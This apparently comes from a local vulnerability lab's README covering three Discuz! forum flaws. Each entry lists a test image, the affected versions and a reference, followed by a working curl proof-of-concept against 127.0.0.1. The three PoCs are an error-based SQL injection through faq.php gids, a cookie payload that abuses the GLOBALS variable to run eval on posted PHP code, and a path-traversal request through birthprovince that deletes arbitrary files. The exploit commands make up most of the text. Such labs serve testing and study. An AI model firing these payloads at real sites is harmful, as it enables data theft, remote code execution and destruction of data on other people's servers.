## faq.php gids 报错注入

测试镜像

* src/discuz/7.2/

影响版本 

* <= 7.2

参考链接

* [Discuz!7.2 faq.php文件SQL注入漏洞分析及利用实战](http://blog.51cto.com/simeon/1440000)

Poc

```
curl -g '127.0.0.1/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28user%28%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23'
```

## Discuz! 6.x/7.x 全局变量防御绕过漏洞

测试镜像

* src/discuz/7.2/

影响版本

* 6.X
* 7.X

参考链接

* [Discuz! 6.x/7.x 全局变量防御绕过导致命令执行](https://www.secpulse.com/archives/2338.html)

Poc - 替换帖子为正确地址

```
curl '127.0.0.1/viewthread.php?tid=13&extra=page%3D1' -H 'Cookie: GLOBALS[_DCACHE][smilies][searcharray] = /.*/eui; GLOBALS[_DCACHE][smilies][replacearray] = eval%28%24_POST%5BMH%5D%29%3B' -d 'MH=die(md5(1));'
```

## birthprovince 任意文件删除

测试镜像

* src/discuz/x3.2/

影响版本 

* <= X3.2

参考链接

* [Discuz!X前台任意文件删除漏洞重现及分析](http://www.freebuf.com/vuls/149904.html)

Poc

```
设置要删除的文件
curl 'http://127.0.0.1/home.php?mod=spacecp&ac=profile&op=base' -d 'birthprovince=../../../hello.txt&profilesubmit=1&formhash=...' -H 'Cookie: ...''

触发漏洞
curl 'http://127.0.0.1/home.php?mod=spacecp&ac=profile&op=base' -F 'profilesubmit=1' -F 'formhash=...' -F birthprovince=@1.jpg -H 'Cookie: ...'
```



